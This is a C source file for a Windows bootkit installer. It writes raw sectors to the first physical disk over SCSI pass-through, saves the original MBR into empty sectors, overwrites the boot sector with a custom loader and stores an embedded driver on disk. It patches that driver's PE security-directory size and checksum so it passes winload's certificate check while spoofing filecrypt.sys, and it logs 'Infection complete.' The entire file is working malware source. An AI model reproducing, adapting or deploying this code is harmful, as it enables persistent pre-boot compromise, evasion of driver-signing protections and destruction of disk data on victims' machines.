#include "bootkit.h"

UINT8 Driver[] =
{
#include "driver.h"
};

static PVOID malloc(SIZE_T Size)
{
	return VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static BOOL free(PVOID Address)
{
	return VirtualFree(Address, 0, MEM_RELEASE);
}

static NTSTATUS AccessDisk(PVOID Buffer, ULONG SectorCount, ULONG StartSector, enum ScsiOperation Op)
{
	STATUS_INIT;
	HANDLE file;
	DWORD bytesReturned;
	SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER request;

	file = CreateFile(STR_PHYSDRIVE0,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (INVALID_HANDLE_VALUE == file)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		LOG("[-] Failed to access hard drive\n");
		goto fail;
	}

	memset(&request, 0, sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER));
	request.sptd.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
	request.sptd.CdbLength = 10; // using 10-byte CDB
	request.sptd.SenseInfoLength = SPT_SENSE_LENGTH;
	request.sptd.DataTransferLength = SectorCount * SECTOR_LENGTH;
	request.sptd.TimeOutValue = 2;
	request.sptd.DataBuffer = Buffer;
	request.sptd.SenseInfoOffset = offsetof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, ucSenseBuf);

	if (Op == ScsiRead)
	{
		request.sptd.DataIn = SCSI_IOCTL_DATA_IN;
		request.sptd.Cdb[0] = SCSIOP_READ;
	}
	else if (Op == ScsiWrite)
	{
		request.sptd.DataIn = SCSI_IOCTL_DATA_OUT;
		request.sptd.Cdb[0] = SCSIOP_WRITE;
	}
	else
	{
		goto fail;
	}

	request.sptd.Cdb[2] = HIBYTE(HIWORD(StartSector)); // logical block address
	request.sptd.Cdb[3] = LOBYTE(HIWORD(StartSector));
	request.sptd.Cdb[4] = HIBYTE(LOWORD(StartSector));
	request.sptd.Cdb[5] = LOBYTE(LOWORD(StartSector));
	request.sptd.Cdb[7] = HIBYTE(SectorCount); // transfer length
	request.sptd.Cdb[8] = LOBYTE(SectorCount);
	// https://www.seagate.com/files/staticfiles/support/docs/manual/Interface%20manuals/100293068j.pdf

	if (!DeviceIoControl(
		file,
		IOCTL_SCSI_PASS_THROUGH_DIRECT,
		&request,
		sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER),
		&request,
		sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER),
		&bytesReturned,
		NULL))
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		LOG("[-] Failed disk operation\n");
		goto fail;
	}

	if (request.sptd.DataTransferLength != SectorCount * SECTOR_LENGTH)
	{
		status = STATUS_DATA_ERROR;
		LOG("[-] Invalid transfer length\n");
		goto fail;
	}
	
	status = STATUS_SUCCESS;
fail:
	if (INVALID_HANDLE_VALUE != file)
	{
		CloseHandle(file);
	}
	return status;
}

// Sector is followed by Count empty sectors
static NTSTATUS FindEmptySectors(UINT32 Count, PUINT32 Sector)
{
	STATUS_INIT;
	char* sector = NULL;
	UINT32 temp_count = 0;

	sector = malloc(SECTOR_LENGTH);
	if (NULL == sector)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		goto fail;
	}

	UINT32 i = 1;
	for (;i < UINT16_MAX; i++)
	{
		status = AccessDisk(sector, 1, i - 1, ScsiRead);
		if (!NT_SUCCESS(status))
		{
			goto fail;
		}

		UINT32 j = 0;
		for (; j < SECTOR_LENGTH; j++)
		{
			if (sector[j])
			{
				break;
			}
		}
		if (j == SECTOR_LENGTH) // if the sector is empty
		{
			temp_count++;
		}
		else
		{
			temp_count = 0;
		}

		if (temp_count == Count)
		{
			i -= Count;
			break;
		}
	}
	if (i == UINT16_MAX) // max read from bios int13 (non-extended)
	{
		status = STATUS_NOT_FOUND;
		goto fail;
	}

	*Sector = i;
	status = STATUS_SUCCESS;
	LOG("[+] Found empty section on hard drive\n");
fail:
	free(sector);
	return status;
}

static NTSTATUS FixupPe(PUINT8 Base, UINT32 Size)
{
	STATUS_INIT;
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)Base;
	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(Base + dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER64* opHeader = &ntHeader->OptionalHeader;
	LARGE_INTEGER fileSize;
	UINT32 fixupSize = 0;
	
	HANDLE file = CreateFileA(
		"C:\\Windows\\System32\\drivers\\filecrypt.sys",
		FILE_READ_ATTRIBUTES, FALSE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == file)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		goto fail;
	}

	if (!GetFileSizeEx(file, &fileSize) || fileSize.LowPart < Size)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		LOG("[-] Failed to get file size\n");
		goto fail;
	}

	if (fileSize.LowPart < Size)
	{
		status = STATUS_INVALID_BUFFER_SIZE;
		LOG("[-] Driver is too large\n");
		goto fail;
	}

	fixupSize = fileSize.LowPart;
	fixupSize -= opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
	fixupSize -= opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size;

	// increase size to pass check in winload!BlImgGetValidatedCertificateLocation
	opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size += fixupSize;

	// fix checksum (see winload!BlUtlCheckSum)
	opHeader->CheckSum -= Size;	
	opHeader->CheckSum += (UINT16)fixupSize;
	opHeader->CheckSum = (UINT16)((opHeader->CheckSum >> 16) + opHeader->CheckSum);
	opHeader->CheckSum += (UINT16)(fixupSize >> 16);
	opHeader->CheckSum = (UINT16)((opHeader->CheckSum >> 16) + opHeader->CheckSum) + fileSize.LowPart;

	status = STATUS_SUCCESS;
	LOG("[+] Fixed up PE for spoofing\n");
fail:
	if (INVALID_HANDLE_VALUE != file)
	{
		CloseHandle(file);
	}
	return status;
}

NTSTATUS Install(const UINT8 Bootkit[], UINT16 BootkitSize)
{
	STATUS_INIT;
	UINT8* mbr = NULL;
	UINT8 bkSectorCount = CALC_SECTOR_COUNT(BootkitSize);
	UINT8 driverSectorCount = CALC_SECTOR_COUNT(sizeof(Driver));
	UINT8* bkBuf = NULL;
	UINT8* driverBuf = NULL;
	UINT32 origMbrSector = 0;
	UINT32 driverSector = 0;

	LOG("[*] Installing bootkit...\n");

	mbr = malloc(SECTOR_LENGTH);
	if (NULL == mbr)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		goto fail;
	}

	bkBuf = malloc(bkSectorCount * SECTOR_LENGTH);
	if (NULL == bkBuf)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		goto fail;
	}

	memset(bkBuf, 0, bkSectorCount * SECTOR_LENGTH);
	memcpy(bkBuf, Bootkit, BootkitSize);

	driverBuf = malloc(driverSectorCount * SECTOR_LENGTH);
	if (NULL == driverBuf)
	{
		status = STATUS_SPACES_EXTENDED_ERROR;
		goto fail;
	}

	memset(driverBuf, 0, driverSectorCount * SECTOR_LENGTH);
	memcpy(driverBuf, Driver, sizeof(Driver));

	status = FixupPe(driverBuf, sizeof(Driver));
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	status = AccessDisk(mbr, 1, 0, ScsiRead); // read mbr
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	if (MBR_MAGIC != *(PUINT16)(&mbr[SECTOR_LENGTH - sizeof(UINT16)]))
	{
		status = STATUS_NOT_FOUND;
		LOG("[-] Boot sector magic not found\n");
		goto fail;
	}

	// is it already installed?
	UINT16 i = 0;
	for (; i < MBR_DISK_SIGNATURE_OFFSET - 4; i++)
	{
		UINT16* nextCheck = (UINT16*)(bkBuf + 4 + i);

		// ignore the bytes to be fixed up
		if (ORIG_MBR_MAGIC == *nextCheck ||
			DRV_SIZE_MAGIC == *nextCheck ||
			DRV_SECT_MAGIC == *nextCheck)
		{
			i++;
			continue;
		}

		if (*(UINT8*)nextCheck != *(mbr + 4 + i))
		{
			break;
		}
	}
	if (i == MBR_DISK_SIGNATURE_OFFSET - 4)
	{
		status = STATUS_ALREADY_INITIALIZED;
		LOG("[-] Bootkit already installed\n");
		goto fail;
	}

	// write to a large enough area that is zeroed out
	status = FindEmptySectors(bkSectorCount + driverSectorCount, &origMbrSector);
	if (!NT_SUCCESS(status))
	{
		LOG("[-] Unable to find required disk space\n");
		goto fail;
	}
	driverSector = origMbrSector + bkSectorCount;

	// fix up magic values
	for (int i = 0; i < SECTOR_LENGTH; i++)
	{
		switch (*(UINT16*)(bkBuf + i))
		{
		case ORIG_MBR_MAGIC:
		{
			// tell bootkit where the original mbr was written
			*(UINT16*)(bkBuf + i) = origMbrSector + 1;
			break;
		}
		case DRV_SIZE_MAGIC:
		{
			// tell bootkit the size of the driver
			*(UINT16*)(bkBuf + i) = driverSectorCount;
			break;
		}
		case DRV_SECT_MAGIC:
		{
			// tell bootkit where the driver was written
			*(UINT16*)(bkBuf + i) = driverSector + 1;
			break;
		}
		}
	}

	// preserve original disk signature and partition table
	memcpy(
		bkBuf + MBR_DISK_SIGNATURE_OFFSET,
		mbr + MBR_DISK_SIGNATURE_OFFSET,
		SECTOR_LENGTH - MBR_DISK_SIGNATURE_OFFSET);

	// copy original mbr to the first of the empty sectors
	status = AccessDisk(mbr, 1, origMbrSector, ScsiWrite);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	// overwrite first sector with custom mbr
	status = AccessDisk(bkBuf, 1, 0, ScsiWrite);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	// write remaining part of bootkit to disk
	status = AccessDisk(bkBuf + SECTOR_LENGTH, bkSectorCount - 1, origMbrSector + 1, ScsiWrite);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}
	
	// store driver
	status = AccessDisk(driverBuf, driverSectorCount, driverSector, ScsiWrite);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	LOG("[+] Infection complete. See you on the other side.\n");
fail:
	free(driverBuf);
	free(bkBuf);
	free(mbr);
	return status;
}